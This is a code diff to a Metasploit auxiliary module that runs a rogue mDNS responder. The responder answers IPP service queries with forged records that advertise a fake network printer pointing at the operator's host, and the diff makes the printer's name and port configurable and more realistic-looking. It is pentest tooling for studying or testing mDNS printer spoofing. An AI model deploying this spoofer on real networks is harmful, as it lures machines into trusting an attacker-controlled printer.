@@ -6,9 +6,8 @@
 
 class MetasploitModule < Msf::Auxiliary
 
-  include Msf::Exploit::Remote::DNS::Server
-
-  MULTICAST_ADDR = '224.0.0.251'
+  include Exploit::Remote::DNS::Common
+  include Exploit::Remote::SocketServer
 
   def initialize(info = {})
     super(update_info(info,
@@ -32,6 +31,11 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'DefaultAction'  => 'Service'
     ))
+
+    register_advanced_options(
+      [
+        OptString.new('PrinterName', [true, 'The printer name', Faker::Device.model_name])
+      ])
   end
 
   #
@@ -39,28 +43,55 @@ class MetasploitModule < Msf::Auxiliary
   #
   def run
     begin
-      start_service
+      start_mdns_service
       service.wait
     rescue Rex::BindFailed => e
       print_error "Failed to bind to port #{datastore['RPORT']}: #{e.message}"
     end
   end
 
+  # mDNS code below
+
+  def start_mdns_service
+    begin
+      comm = _determine_server_comm(bindhost)
+      self.service = Rex::ServiceManager.start(
+        Rex::Proto::MDNS::Server,
+        bindhost,
+        5353,
+        false,
+        nil,
+        comm,
+        {'Msf' => framework, 'MsfExploit' => self}
+      )
+
+      self.service.dispatch_request_proc = Proc.new do |cli, data|
+        on_dispatch_mdns_request(cli, data)
+      end
+      self.service.send_response_proc = Proc.new do |cli, data|
+        on_send_mdns_response(cli, data)
+      end
+    rescue ::Errno::EACCES => e
+      raise Rex::BindFailed.new(e.message)
+    end
+  end
+
   #
   # Creates Proc to handle incoming requests
   #
-  def on_dispatch_request(cli, data)
+  def on_dispatch_mdns_request(cli, data)
     return if data.strip.empty?
 
     req = Packet.encode_drb(data)
 
-    return unless req.answer.empty? # don't process responses at all
+    return if req.header.qr # this is a response so ignore it because we're a server # don't process responses at all
 
     peer = Rex::Socket.to_authority(cli.peerhost, cli.peerport)
     asked = req.question.map(&:qname).map(&:to_s).join(', ')
     vprint_status("Received request for #{asked} from #{peer}")
 
-    printer_name = 'MSF8_printer'
+    printer_name = datastore['PrinterName']
+    ipp_printer_name = "#{printer_name.gsub(/ /, '_')}._ipp._tcp.local"
 
     req.question.each do |question|
       case question.qname.to_s
@@ -69,45 +100,41 @@ class MetasploitModule < Msf::Auxiliary
           name: '_ipp._tcp.local.',
           type: 'PTR',
           ttl: 4500,
-          domainname: "#{printer_name}._ipp._tcp.local"
+          domainname: ipp_printer_name
         ))
         req.add_answer(Dnsruby::RR.create(
-          name: "#{printer_name}._ipp._tcp.local",
+          name: ipp_printer_name,
           type: 'SRV',
           ttl: 120,
           target: "#{printer_name}.local",
           priority: 0,
           weight: 0,
-          port: 8631
+          port: srvport
         ))
         req.add_answer(Dnsruby::RR.create(
-          name: "#{printer_name}._ipp._tcp.local",
+          name: ipp_printer_name,
           type: 'TXT',
           ttl: 4500
         ).tap { |rr| rr.strings = [
             'txtvers=1',
             'qtotal=1',
-            'rp=printers/hax',
-            'ty=MSF Printer (Unicast)',
+            'ty=Printer',
             'pdl=application/postscript,application/pdf',
             'UUID=ff3332a5-a6e3-4ac7-9679-16c322f153a4',
             'printer-type=0x800683'
           ]
-
         })
-
         req.add_answer(Dnsruby::RR.create(
           name: "#{printer_name}.local",
           type: 'A',
           ttl: 120,
-          address: bindhost
+          address: srvhost
         ))
       end
     end
 
     req.question.clear
     req.update_counts
-
     return if req.answer.empty?
 
     req.header.aa = true
@@ -118,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Creates Proc to handle outbound responses
   #
-  def on_send_response(cli,data)
+  def on_send_mdns_response(cli,data)
     vprint_status("Sending response to #{Rex::Socket.to_authority(cli.peerhost, cli.peerport)}")
     cli.write(data)
   end
